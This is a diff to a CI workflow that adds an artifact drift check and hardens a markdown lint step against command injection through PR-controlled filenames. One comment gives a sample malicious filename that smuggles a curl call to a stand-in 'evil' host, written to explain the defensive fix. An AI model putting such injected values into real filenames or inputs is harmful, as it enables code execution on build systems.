@@ -7,9 +7,9 @@ name: CI
 
 on:
   pull_request:
-  # #5215 D13 / Task 8: five of the six branch-protection required contexts
-  # (pricing-artifact, docs, test-isolation, license-surface, legal-e2e) are
-  # emitted by THIS workflow, which was `pull_request:`-only — so main had no
+  # #5215 D13 / Task 8: the cheap branch-protection required contexts EMITTED BY
+  # THIS WORKFLOW (pricing-artifact, docs, test-isolation, license-surface, legal-e2e)
+  # were `pull_request:`-only — so main had no
   # post-merge signal for them and a required context could sit red on main
   # with nothing reporting it. (Not the #5583 class: that was a retrieval
   # defect in `tortoise/search_engine.py`, whose suite `python-ci.yml` already
@@ -161,6 +161,13 @@ jobs:
                   # skips dashboard-js-tests, so the behavioural tests for the
                   # very file under review would never run.
                   isfile("website/assets/supabase-session.js"),
+                  # #3787: `website/consent.js` is copied into the dashboard's
+                  # dist by `scripts/copy-shared-assets.mjs` as part of
+                  # `npm run build`, and the shipped-artifact guard in
+                  # src/distBundle.test.js reads that copy. Same rule as the
+                  # bridge entry above: naming the input is what makes the
+                  # guard run on the file it scans.
+                  isfile("website/consent.js"),
                   # #3525: the dashboard's security-headers guard also pins the
                   # MARKETING project's CSP, and it SCANS both projects'
                   # `functions/` trees (cookie writers, `text/html` producers) —
@@ -440,6 +447,9 @@ jobs:
                   # changes the served bundle — it too used to surface only
                   # through the committed dist rebuild.
                   isfile("product/pricing.json"),
+                  # #3787: the same copied build input — a consent-only change
+                  # changes the bundle this lane serves.
+                  isfile("website/consent.js"),
                   isfile(".github/workflows/ci.yml"),
               ),
               # ai-review-gate-tests (#2982): the signed-review merge gate's
@@ -473,10 +483,17 @@ jobs:
   #   migration-append-only    — edits/renames/deletions of already-merged
   #                              migrations are rejected (a change to an applied
   #                              migration must be a NEW timestamp file).
-  #                              #1235: when SUPABASE_ACCESS_TOKEN is available
-  #                              (same-repo PRs), a PURE PREFIX RENAME of a
-  #                              provably-unapplied migration is exempt; fork
-  #                              PRs (no token) keep the strict block (fail-closed).
+  #                              #1235/#2240: when SUPABASE_ACCESS_TOKEN is
+  #                              available (same-repo PRs), the exemption covers
+  #                              only a git-detected forward prefix rename (R*)
+  #                              whose destination version sorts strictly AFTER
+  #                              the newest applied version, with BOTH endpoints
+  #                              provably unapplied — the remedy
+  #                              check-migration-drift prescribes for an
+  #                              out-of-order repo-ahead migration. An edit or a
+  #                              deletion (M/T/D) carries no destination version,
+  #                              so it is NEVER exempt. Fork PRs (no token) keep
+  #                              the strict block (fail-closed).
   # Both drive the shared .github/scripts/check-migration-append-only script so
   # tests exercise the shipped logic. fetch-depth: 0 is required for the base
   # SHA to be available to `git diff` (default checkout is depth 1).
@@ -570,8 +587,8 @@ jobs:
       # three-dot diff against `pull_request.base.sha`, so the base COMMIT must
       # be in the local object store. The default depth-1 checkout omits it and
       # the diff dies with `fatal: Invalid symmetric difference expression
-      # <base>...HEAD`; that fatal was swallowed by `|| true`, `files` came out
-      # empty, both lint steps were skipped and the REQUIRED `docs` check
+      # <base>...HEAD`; that fatal was swallowed by a tolerance, the changed list
+      # came out empty, both lint steps were skipped and the REQUIRED `docs` check
       # reported green without linting anything (job 100109903325). Full depth
       # makes the base resolvable, so the diff is a real function of the PR's
       # changes.
@@ -612,6 +629,49 @@ jobs:
             exit 1
           fi
           echo "no conflict markers"
+      - uses: actions/setup-python@v5
+        with:
+          # The generators carry the #5128 `>=3.12` runtime guard, which exits
+          # EXIT_USAGE rather than silently running on an older interpreter.
+          python-version: '3.12'
+      - name: Generated-artifact drift check (#4454)
+        # #4454: a PR that edits ONLY a generated DOCUMENT under `docs/` never
+        # runs the matrix — `docs/` is in NON_PYTHON_PREFIXES and no
+        # SOURCE_PATTERNS entry claims a `.md` path, so a docs-only change
+        # selects `surfaces: []` and the guard test is skipped by the deliberate
+        # docs-PR policy. (A `tools/`-only edit is NOT skipped: PR #4177 named
+        # the generators in SOURCE_PATTERNS, which beats the non-python prefix.
+        # `config/sdk-surface.json` also selects `core`.)
+        #
+        # It lives here, and runs unconditionally, because `docs` is a REQUIRED
+        # context with no `paths:` filter (only the non-required jobs in this
+        # file are path-gated, #2149) — so the check cannot inherit the very
+        # skip it exists to close. A path-gated home would reproduce the #2802
+        # shape, where a repo-wide gate was invisible to every gate and shipped
+        # to main twice.
+        #
+        # `--check` is verify-only: it re-renders and exits non-zero on drift.
+        # A bare invocation would REWRITE the artifact and always pass, which
+        # looks present and never fires — worse than absent.
+        #
+        # The install is required, not incidental. The generators import
+        # `tortoise.sdk`, which pulls the declared runtime set (numpy via
+        # cross_lens, prometheus_client via monitoring, fastmcp via
+        # tool_registry). Without it they abort at IMPORT time and exit 1 on
+        # EVERY PR — a fail-always gate that reds this required context and
+        # blocks all merges, the exact opposite of fail-on-drift. The sibling
+        # required artifact job `pricing-artifact` installs the package for the
+        # same reason (its parity check imports `tortoise.pricing`).
+        #
+        # Positive control, run in THIS environment — a developer venv that
+        # already has the package installed cannot exhibit the failure mode:
+        # inject a line into a listed artifact -> exit 1 naming the file;
+        # restore -> exit 0.
+        run: |
+          pip install -e . --quiet
+          python3 tools/bridge_table.py --check
+          python3 tools/mcp_rename_table.py --check
+          python3 tools/sdk_surface.py --check
       - uses: actions/setup-node@v4
         with:
           node-version: '22'
@@ -628,51 +688,73 @@ jobs:
           # is EXECUTED (not text-scanned) by tests/test_docs_lint_gate.py.
           BASE_SHA: ${{ github.event.pull_request.base.sha }}
         run: |
+          # #4449: the list goes to a FILE and is consumed as DATA. A filename
+          # is PR-author-controlled, so it must never reach a shell — a path
+          # like `x $(curl evil)/a.md` would execute. markdownlint reads a NUL
+          # list via `xargs -0`; lychee reads a file via `--files-from`. This is
+          # the same pattern the main-health path below already uses, and the
+          # pin in tests/test_merge_throughput.py is what keeps the safety a
+          # CONTROL rather than an accident of the checkout depth: while the PR
+          # checkout was shallow this PR path could not produce a list at all,
+          # so its interpolation was unreachable rather than safe (#2802/#4449).
+          #
           # `--no-renames` is deliberate here, though this is a lint-target list
           # rather than a changed-set SELECTION set (so the pin that enforces the
-          # flag workflow-wide still applies to it): a rename's deleted .md source
-          # path is tolerated because markdownlint-cli2 exits 0 on a nonexistent
-          # path, and plain .md deletions already produce exactly such paths.
+          # flag workflow-wide still applies to it). `--diff-filter ACMR` keeps
+          # the list to paths that exist on disk: under `--no-renames` a rename
+          # contributes its deleted source path, and a plain .md deletion names a
+          # path lychee hard-errors on.
           # See tests/test_ci_selection.py::test_every_changed_set_diff_disables_rename_detection.
+          # #2386, fail-closed, expressed in the main-health path's own shape
+          # (full-depth checkout, `--diff-filter ACMR`, NUL list, cli2): the
+          # required PR `docs` gate must LINT, so it may not swallow a failed
+          # diff the way the shallow-checkout `|| true` form did.
           set -euo pipefail
-          # #2386, fail-closed. An empty BASE_SHA would make the pathspec below
-          # read `...HEAD` — git's shorthand for `HEAD...HEAD` — which resolves to
-          # an EMPTY diff with exit 0: the exact silent green this step exists to
-          # prevent, one input over.
+          # An empty BASE_SHA would make the pathspec below read `...HEAD` — git's
+          # shorthand for `HEAD...HEAD` — which resolves to an EMPTY diff with
+          # exit 0: the exact silent green this step exists to prevent, one input
+          # over.
           if [ -z "${BASE_SHA:-}" ]; then
             echo "::error::pull_request base SHA is empty — cannot compute the changed markdown set; failing closed (#2386)"
             exit 1
           fi
-          # No `|| true` (#2386): if the base commit is absent from this checkout
-          # the three-dot diff fails HERE and the required check goes red instead
-          # of skipping both lint steps and reporting green.
-          FILES="$(git diff --no-renames --name-only "${BASE_SHA}...HEAD" -- '*.md')"
-          if [ -z "$FILES" ]; then
-            # `files=` rather than a heredoc: an empty heredoc body parses
-            # ambiguously, and a value of "\n" would read as non-empty and run
-            # markdownlint with NO file args — which lints the WHOLE repo.
-            echo 'files=' >> "$GITHUB_OUTPUT"
-          else
-            # Heredoc form: `files=$FILES` with a multi-line value corrupts
-            # $GITHUB_OUTPUT (every line after the first is not NAME=VALUE).
-            {
-              echo 'files<<__CHANGED_MD_EOF__'
-              echo "$FILES"
-              echo '__CHANGED_MD_EOF__'
-            } >> "$GITHUB_OUTPUT"
-          fi
+          # No tolerance on the diff (#2386): the PR checkout is full-depth (see
+          # the checkout step above), so the base resolves. If it does not, the
+          # three-dot diff fails HERE and the REQUIRED check goes red instead of
+          # skipping both lint steps and reporting green.
+          git diff --no-renames --diff-filter ACMR -z --name-only \
+            "${BASE_SHA}...HEAD" -- '*.md' > "$RUNNER_TEMP/pr-md.raw.nul"
+          # `./`-prefix every entry so no path can be read as an OPTION by
+          # xargs (argument injection) and lychee's --files-from never treats
+          # it as a `#` comment. The prefix loop is `read -d ''` rather than
+          # `sed -z`: tests/test_docs_lint_gate.py EXECUTES this body offline,
+          # and BSD/macOS `sed` has no `-z`. The bytes written are identical to
+          # the main-health path's `sed -z` form.
+          : > "$RUNNER_TEMP/pr-md.nul"
+          while IFS= read -r -d '' entry; do
+            printf './%s\0' "$entry" >> "$RUNNER_TEMP/pr-md.nul"
+          done < "$RUNNER_TEMP/pr-md.raw.nul"
+          tr '\0' '\n' < "$RUNNER_TEMP/pr-md.nul" > "$RUNNER_TEMP/pr-md.txt"
+          count="$(grep -c . "$RUNNER_TEMP/pr-md.txt" || :)"
+          echo "count=${count:-0}" >> "$GITHUB_OUTPUT"
       - name: Markdownlint (changed files)
-        if: steps.changed.outputs.files != ''
-        # #2386: cli2 reads the repo's own .markdownlint-cli2.jsonc (MD013 off for
-        # prose). The v1 `markdownlint-cli` cannot parse that JSONC file and
-        # silently fell back to DEFAULTS, so MD013 (line-length 80) fired on every
-        # long research-doc line — the opposite of the declared rules.
-        run: npx --yes markdownlint-cli2@0.23.3 ${{ steps.changed.outputs.files }}
+        if: ${{ !inputs.main_health && steps.changed.outputs.count != '0' }}
+        run: |
+          # NUL-delimited ARGV via xargs — a filename is data, never shell text (#4449).
+          #
+          # cli2, not v1 (#2386): `markdownlint-cli` cannot parse the repo's
+          # .markdownlint-cli2.jsonc and silently fell back to DEFAULTS, so MD013
+          # (line-length 80) fired on the long prose lines the repo config turns
+          # off. This mirrors the main-health path above.
+          xargs -0 -a "$RUNNER_TEMP/pr-md.nul" npx --yes markdownlint-cli2@0.23.3
       - name: Link check (changed files)
-        if: steps.changed.outputs.files != ''
+        if: ${{ !inputs.main_health && steps.changed.outputs.count != '0' }}
         uses: lycheeverse/lychee-action@v2
         with:
-          args: --no-progress ${{ steps.changed.outputs.files }}
+          # `--files-from` reads the list from a FILE — no filename reaches a
+          # shell command (#4449).
+          args: --no-progress --files-from ${{ runner.temp }}/pr-md.txt
+          failIfEmpty: false
       # ----- main-health path (#5215 Task 8 / D13) --------------------------
       # The PR path above cannot run on a schedule (there is no
       # `github.event.pull_request.base.sha`), so under `main_health` the
@@ -705,8 +787,8 @@ jobs:
       - name: Markdownlint (main health, changed files)
         if: ${{ inputs.main_health && steps.changed_mh.outputs.count != '0' }}
         run: |
-          # cli2 reads the repo's .markdownlint-cli2.jsonc (MD013 off for
-          # prose); the PR path's v1 invocation is #2386/#5476's to align.
+          # cli2 reads the repo's .markdownlint-cli2.jsonc (MD013 off for prose);
+          # the PR path above is aligned with this invocation (#2386/#5476).
           # NUL-delimited ARGV via xargs — a filename is data, never shell text.
           xargs -0 -a "$RUNNER_TEMP/changed-md.nul" \
             npx --yes markdownlint-cli2@0.23.3
@@ -823,8 +905,9 @@ jobs:
     # ⚠️ This job is NOT a required status check: a red harness does not block a
     # merge, so a regression here can land and then silently let the
     # `ai-review-gate` check pass without evaluating evidence. `ai-review-gate`
-    # is itself NOT a required check either (verified 2026-09-28, #5426), so
-    # neither job gates a merge. Tracked in #3091
+    # IS a required check since #5433 (live branch protection + a Mergify entry
+    # condition), so a red there does block — but this harness job still does not.
+    # Tracked in #3091
     # (add this job to branch protection, or move the harness into an
     # always-run required job). The `if:` above is a complete per-surface guard:
     # it fires on any change to the gate workflow, this harness, or ci.yml.
@@ -906,7 +989,7 @@ jobs:
     # `left` values both pass, so no fixed bound can satisfy both), that a
     # disagreement between the workflow's count and the sweep's own measurement
     # reds, that a violation of the sweep's accounting identity
-    # (`reaped + left < before`) reds, that `cleared: false` is keyed on the
+    # (`reaped + exited + left < before`) reds, that `cleared: false` is keyed on the
     # measured COUNT (a zero count passes with a warning, a non-zero count
     # reds), that an 18+ digit number exits 2 as a usage error rather than
     # reaching the pass line, and that a red verdict never falls through to a
